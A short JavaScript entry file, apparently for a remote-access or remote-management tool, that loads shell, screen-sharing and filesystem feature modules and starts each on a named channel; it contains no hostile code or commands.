/*
 * @Description: 
 * @Version: 1.0
 * @Autor: solid
 * @Date: 2022-10-31 14:06:37
 * @LastEditors: solid
 * @LastEditTime: 2022-11-03 18:18:26
 */

var ShellConn = require("./featureList/shell")
var ScreenConn = require("./featureList/screen")
var FilesystemConn = require("./featureList/filesystem")
ShellConn("ws")
ScreenConn("screen")
FilesystemConn("file")